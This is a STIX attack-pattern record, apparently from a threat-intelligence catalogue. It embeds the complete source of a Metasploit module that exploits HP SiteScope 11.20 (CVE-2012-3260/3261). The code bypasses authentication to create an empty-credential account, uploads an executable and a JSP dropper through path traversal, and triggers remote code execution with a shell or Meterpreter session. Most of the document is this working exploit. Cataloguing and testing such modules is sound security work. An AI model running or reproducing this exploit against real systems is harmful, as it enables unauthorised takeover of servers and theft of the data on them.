{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--79650eaa-056b-45ab-bf5f-9a0baa1c76bf",
    "created": "2024-08-14T17:09:54.848802Z",
    "modified": "2024-08-14T17:09:54.848806Z",
    "name": "HP SiteScope Remote Code Execution",
    "description": " This module exploits a code execution flaw in HP SiteScope. It exploits two vulnerabilities in order to get its objective. An authentication bypass in the create operation, available through the APIPreferenceImpl AXIS service, to create a new account with empty credentials and, subsequently, uses the new account to abuse the UploadManagerServlet and upload an arbitrary payload embedded in a JSP. The module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2 and Linux CentOS 6.3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/hp_sitescope_uploadfileshandler.rb",
            "external_id": "hp_sitescope_uploadfileshandler.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3260"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3261"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HP SiteScope Remote Code Execution',\n        'Description' => %q{\n          This module exploits a code execution flaw in HP SiteScope. It exploits two\n          vulnerabilities in order to get its objective. An authentication bypass in the\n          create operation, available through the APIPreferenceImpl AXIS service, to create\n          a new account with empty credentials and, subsequently, uses the new account to\n          abuse the UploadManagerServlet and upload an arbitrary payload embedded in a JSP.\n          The module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2\n          and Linux CentOS 6.3.\n        },\n        'Author' => [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2012-3260' ],\n          [ 'CVE', '2012-3261' ],\n          [ 'OSVDB', '85121' ],\n          [ 'OSVDB', '85151' ],\n          [ 'BID', '55269' ],\n          [ 'BID', '55273' ],\n          [ 'ZDI', '12-174' ],\n          [ 'ZDI', '12-175' ]\n        ],\n        'Privileged' => true,\n        'Platform' => %w{linux win},\n        'Targets' => [\n          [\n            'HP SiteScope 11.20 / Windows 2003 SP2',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n          [\n            'HP SiteScope 11.20 / Linux CentOS 6.3',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-08-29',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      client.fs.file.rm(\"../#{@var_hexfile}.txt\")\n      client.fs.file.rm(\"../#{@jsp_name}.jsp\")\n    else\n      if target['Platform'] == 'linux'\n        client.shell_command_token(\"rm ../#{@var_hexfile}.txt\")\n        client.shell_command_token(\"rm ../#{@jsp_name}.jsp\")\n      elsif target['Platform'] == 'win'\n        client.shell_command_token(\"del ..\\\\#{@var_hexfile}.txt\")\n        client.shell_command_token(\"del ..\\\\#{@jsp_name}.jsp\")\n      end\n    end\n  end\n\n  def exploit\n    @uri = normalize_uri(target_uri.path)\n    @uri << '/' if @uri[-1, 1] != '/'\n\n    # Create user with empty credentials\n    print_status(\"Creating user with empty credentials\")\n\n    if create_user.nil?\n      print_error(\"Failed to create user\")\n      return\n    end\n\n    # Generate an initial JSESSIONID\n    print_status(\"Retrieving an initial JSESSIONID\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(@uri, 'servlet/Main'),\n      'method' => 'POST'\n    )\n\n    if res and res.code == 200 and res.get_cookies =~ /JSESSIONID=([0-9A-F]*);/\n      session_id = $1\n    else\n      print_error(\"Retrieve of initial JSESSIONID failed\")\n      return\n    end\n\n    # Authenticate\n    login_data = \"j_username=&j_password=\"\n\n    print_status(\"Authenticating on HP SiteScope Configuration\")\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(@uri, 'j_security_check'),\n        'method' => 'POST',\n        'data' => login_data,\n        'ctype' => \"application/x-www-form-urlencoded\",\n        'headers' =>\n          {\n            'Cookie' => \"JSESSIONID=#{session_id}\",\n          }\n      }\n    )\n\n    if res and res.code == 302 and res.get_cookies =~ /JSESSIONID=([0-9A-F]*);/\n      session_id = $1\n      redirect = URI(res.headers['Location']).path\n    else\n      print_error(\"Authentication on SiteScope failed\")\n      return\n    end\n\n    # Follow redirection to complete authentication process\n    print_status(\"Following redirection to finish authentication\")\n    res = send_request_cgi(\n      {\n        'uri' => redirect,\n        'method' => 'GET',\n        'headers' =>\n          {\n            'Cookie' => \"JSESSIONID=#{session_id}\",\n          }\n      }\n    )\n\n    if not res or res.code != 200\n      print_error(\"Authentication on SiteScope failed\")\n      return\n    end\n\n    # Upload the JSP and the raw payload\n    @jsp_name = rand_text_alphanumeric(8 + rand(8))\n\n    # begin <payload>.jsp\n    var_hexpath = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_exepath = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_data = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_inputstream = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_outputstream = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_numbytes = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_bytearray = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_bytes = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_counter = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_char1 = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_char2 = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_comb = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_exe = Rex::Text.rand_text_alpha(rand(8) + 8)\n    @var_hexfile = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_proc = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_fperm = Rex::Text.rand_text_alpha(rand(8) + 8)\n    var_fdel = Rex::Text.rand_text_alpha(rand(8) + 8)\n\n    jspraw = \"<%@ page import=\\\"java.io.*\\\" %>\\n\"\n    jspraw << \"<%\\n\"\n    jspraw << \"String #{var_hexpath} = application.getRealPath(\\\"/\\\") + \\\"/#{@var_hexfile}.txt\\\";\\n\"\n    jspraw << \"String #{var_exepath} = System.getProperty(\\\"java.io.tmpdir\\\") + \\\"/#{var_exe}\\\";\\n\"\n    jspraw << \"String #{var_data} = \\\"\\\";\\n\"\n\n    jspraw << \"if (System.getProperty(\\\"os.name\\\").toLowerCase().indexOf(\\\"windows\\\") != -1){\\n\"\n    jspraw << \"#{var_exepath} = #{var_exepath}.concat(\\\".exe\\\");\\n\"\n    jspraw << \"}\\n\"\n\n    jspraw << \"FileInputStream #{var_inputstream} = new FileInputStream(#{var_hexpath});\\n\"\n    jspraw << \"FileOutputStream #{var_outputstream} = new FileOutputStream(#{var_exepath});\\n\"\n\n    jspraw << \"int #{var_numbytes} = #{var_inputstream}.available();\\n\"\n    jspraw << \"byte #{var_bytearray}[] = new byte[#{var_numbytes}];\\n\"\n    jspraw << \"#{var_inputstream}.read(#{var_bytearray});\\n\"\n    jspraw << \"#{var_inputstream}.close();\\n\"\n\n    jspraw << \"byte[] #{var_bytes} = new byte[#{var_numbytes}/2];\\n\"\n    jspraw << \"for (int #{var_counter} = 0; #{var_counter} < #{var_numbytes}; #{var_counter} += 2)\\n\"\n    jspraw << \"{\\n\"\n    jspraw << \"char #{var_char1} = (char) #{var_bytearray}[#{var_counter}];\\n\"\n    jspraw << \"char #{var_char2} = (char) #{var_bytearray}[#{var_counter} + 1];\\n\"\n    jspraw << \"int #{var_comb} = Character.digit(#{var_char1}, 16) & 0xff;\\n\"\n    jspraw << \"#{var_comb} <<= 4;\\n\"\n    jspraw << \"#{var_comb} += Character.digit(#{var_char2}, 16) & 0xff;\\n\"\n    jspraw << \"#{var_bytes}[#{var_counter}/2] = (byte)#{var_comb};\\n\"\n    jspraw << \"}\\n\"\n\n    jspraw << \"#{var_outputstream}.write(#{var_bytes});\\n\"\n    jspraw << \"#{var_outputstream}.close();\\n\"\n\n    jspraw << \"if (System.getProperty(\\\"os.name\\\").toLowerCase().indexOf(\\\"windows\\\") == -1){\\n\"\n    jspraw << \"String[] #{var_fperm} = new String[3];\\n\"\n    jspraw << \"#{var_fperm}[0] = \\\"chmod\\\";\\n\"\n    jspraw << \"#{var_fperm}[1] = \\\"+x\\\";\\n\"\n    jspraw << \"#{var_fperm}[2] = #{var_exepath};\\n\"\n    jspraw << \"Process #{var_proc} = Runtime.getRuntime().exec(#{var_fperm});\\n\"\n    jspraw << \"if (#{var_proc}.waitFor() == 0) {\\n\"\n    jspraw << \"#{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\\n\"\n    jspraw << \"}\\n\"\n    # Linux and other UNICES allow removing files while they are in use...\n    jspraw << \"File #{var_fdel} = new File(#{var_exepath}); #{var_fdel}.delete();\\n\"\n    jspraw << \"} else {\\n\"\n    # Windows does not ..\n    jspraw << \"Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\\n\"\n    jspraw << \"}\\n\"\n\n    jspraw << \"%>\\n\"\n\n    # Specify the payload in hex as an extra file..\n    payload_hex = payload.encoded_exe.unpack('H*')[0]\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(payload_hex, \"application/octet-stream\", nil, \"form-data; name=\\\"#{rand_text_alpha(4)}\\\"; filename=\\\"#{rand_text_alpha(4)}.png\\\"\")\n\n    if target['Platform'] == \"linux\"\n      traversal = \"../../../../../../\"\n    elsif target['Platform'] == \"win\"\n      traversal = \"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\\"\n    end\n\n    print_status(\"Uploading the payload\")\n    res = send_request_cgi(\n      {\n        'uri' => \"#{@uri}upload?REMOTE_HANDLER_KEY=UploadFilesHandler&UploadFilesHandler.file.name=#{traversal}#{@var_hexfile}.txt&UploadFilesHandler.ovveride=true\",\n        'method' => 'POST',\n        'data' => post_data.to_s,\n        'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n        'headers' =>\n          {\n            'Cookie' => \"JSESSIONID=#{session_id}\",\n          }\n      }\n    )\n\n    if res and res.code == 200 and res.body =~ /file: (.*) uploaded succesfuly to server/\n      path = $1\n      print_good(\"Payload successfully uploaded to #{path}\")\n    else\n      print_error(\"Error uploading the Payload\")\n      return\n    end\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(jspraw, \"application/octet-stream\", nil, \"form-data; name=\\\"#{rand_text_alpha(4)}\\\"; filename=\\\"#{rand_text_alpha(4)}.png\\\"\")\n\n    print_status(\"Uploading the JSP\")\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(@uri, 'upload') + \"?REMOTE_HANDLER_KEY=UploadFilesHandler&UploadFilesHandler.file.name=#{traversal}#{@jsp_name}.jsp&UploadFilesHandler.ovveride=true\",\n        'method' => 'POST',\n        'data' => post_data.to_s,\n        'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n        'headers' =>\n          {\n            'Cookie' => \"JSESSIONID=#{session_id}\",\n          }\n      }\n    )\n\n    if res and res.code == 200 and res.body =~ /file: (.*) uploaded succesfuly to server/\n      path = $1\n      print_good(\"JSP successfully uploaded to #{path}\")\n    else\n      print_error(\"Error uploading the JSP\")\n      return\n    end\n\n    print_status(\"Triggering payload at '#{@uri}#{@jsp_name}.jsp' ...\")\n    send_request_cgi(\n      {\n        'uri' => normalize_uri(@uri, \"#{@jsp_name}.jsp\"),\n        'method' => 'GET',\n        'headers' =>\n          {\n            'Cookie' => \"JSESSIONID=#{session_id}\",\n          }\n      }\n    )\n  end\n\n  def create_user\n    data = \"<?xml version='1.0' encoding='UTF-8'?>\" + \"\\r\\n\"\n    data << \"<wsns0:Envelope\" + \"\\r\\n\"\n    data << \"xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \"xmlns:xsd='http://www.w3.org/2001/XMLSchema'\" + \"\\r\\n\"\n    data << \"xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<wsns0:Body\" + \"\\r\\n\"\n    data << \"wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<impl:create\" + \"\\r\\n\"\n    data << \"xmlns:impl='http://Api.freshtech.COM'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<in0\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:string'\" + \"\\r\\n\"\n    data << \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \">UserInstancePreferences</in0>\" + \"\\r\\n\"\n    data << \"<in1\" + \"\\r\\n\"\n    data << \"xsi:type='apachesoap:Map'\" + \"\\r\\n\"\n    data << \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<item\" + \"\\r\\n\"\n    data << \"xsi:type='apachesoap:mapItem'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<key\" + \"\\r\\n\"\n    data << \"xsi:nil='true'\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:anyType'\" + \"\\r\\n\"\n    data << \"></key>\" + \"\\r\\n\"\n    data << \"<value\" + \"\\r\\n\"\n    data << \"xsi:nil='true'\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:anyType'\" + \"\\r\\n\"\n    data << \"></value>\" + \"\\r\\n\"\n    data << \"</item>\" + \"\\r\\n\"\n    data << \"</in1>\" + \"\\r\\n\"\n    data << \"</impl:create>\" + \"\\r\\n\"\n    data << \"</wsns0:Body>\" + \"\\r\\n\"\n    data << \"</wsns0:Envelope>\" + \"\\r\\n\"\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(@uri, 'services/APIPreferenceImpl'),\n      'method' => 'POST',\n      'ctype' => 'text/xml; charset=UTF-8',\n      'data' => data,\n      'headers' => {\n        'SOAPAction' => '\"\"',\n      }\n    })\n\n    if res and res.code == 200 and res.body =~ /createResponse/ and res.body =~ /_id/\n      return res\n    end\n\n    return nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-29",
    "x_mitre_platforms": [
        "linux"
    ]
}